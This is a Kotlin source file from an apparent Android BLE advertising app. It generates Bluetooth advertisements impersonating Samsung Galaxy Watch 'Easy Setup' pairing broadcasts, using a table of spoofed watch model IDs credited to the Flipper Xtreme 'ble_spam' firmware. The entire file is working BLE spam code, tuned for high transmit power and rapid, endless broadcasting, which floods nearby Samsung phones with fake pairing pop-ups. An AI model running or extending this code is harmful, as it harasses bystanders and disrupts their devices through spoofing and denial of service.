package io.github.kirillka645.bleadvertiserpro.AdvertisementSetGenerators

import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import io.github.kirillka645.bleadvertiserpro.Callbacks.GenericAdvertisingCallback
import io.github.kirillka645.bleadvertiserpro.Callbacks.GenericAdvertisingSetCallback
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertiseMode
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertisementSetRange
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertisementSetType
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertisementTarget
import io.github.kirillka645.bleadvertiserpro.Enums.PrimaryPhy
import io.github.kirillka645.bleadvertiserpro.Enums.SecondaryPhy
import io.github.kirillka645.bleadvertiserpro.Enums.TxPowerLevel
import io.github.kirillka645.bleadvertiserpro.Helpers.StringHelpers
import io.github.kirillka645.bleadvertiserpro.Helpers.StringHelpers.Companion.toHexString
import io.github.kirillka645.bleadvertiserpro.Models.AdvertisementSet
import io.github.kirillka645.bleadvertiserpro.Models.ManufacturerSpecificData

class EasySetupWatchAdvertisementSetGenerator:IAdvertisementSetGenerator{

    // Device Id's taken from here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/blob/dev/applications/external/ble_spam/protocols/easysetup.c

    private val _manufacturerId = 117 // 0x75 == 117 = Samsung

    private val preprendedBytesWatch = StringHelpers.decodeHex("010002000101FF000043")

    val _genuineWatchIds = mapOf(
        "1A" to "Fallback Watch",
        // Galaxy Watch 4
        "01" to "White Watch4 Classic 44m",
        "02" to "Black Watch4 Classic 40m",
        "03" to "White Watch4 Classic 40m",
        "04" to "Black Watch4 44mm",
        "05" to "Silver Watch4 44mm",
        "06" to "Green Watch4 44mm",
        "07" to "Black Watch4 40mm",
        "08" to "White Watch4 40mm",
        "09" to "Gold Watch4 40mm",
        "0A" to "French Watch4",
        "0B" to "French Watch4 Classic",
        // Galaxy Watch 5
        "0C" to "Fox Watch5 44mm",
        "11" to "Black Watch5 44mm",
        "12" to "Sapphire Watch5 44mm",
        "13" to "Purpleish Watch5 40mm",
        "14" to "Gold Watch5 40mm",
        "15" to "Black Watch5 Pro 45mm",
        "16" to "Gray Watch5 Pro 45mm",
        "17" to "White Watch5 44mm",
        "18" to "White & Black Watch5",
        // Galaxy Watch 6
        "1B" to "Black Watch6 Pink 40mm",
        "1C" to "Gold Watch6 Gold 40mm",
        "1D" to "Silver Watch6 Cyan 44mm",
        "1E" to "Black Watch6 Classic 43m",
        "20" to "Green Watch6 Classic 43m",
        "21" to "Silver Watch6 Classic 47m",
        // Galaxy Watch FE / 7 / Ultra
        "22" to "Black Watch FE 40mm",
        "23" to "Silver Watch FE 40mm",
        "24" to "Pink Watch FE 40mm",
        "25" to "Green Watch7 40mm",
        "26" to "Cream Watch7 40mm",
        "27" to "Silver Watch7 44mm",
        "28" to "Green Watch7 44mm",
        "29" to "Titanium Watch Ultra Gray",
        "2A" to "Titanium Watch Ultra White",
        "2B" to "Titanium Watch Ultra Orange",
    )

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: _genuineWatchIds

        // WATCHES
        data.map {
            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_SAMSUNG
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_EASY_SETUP_WATCH
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData = preprendedBytesWatch.plus(StringHelpers.decodeHex(it.key))

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = true

            // General Data
            advertisementSet.title = it.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}
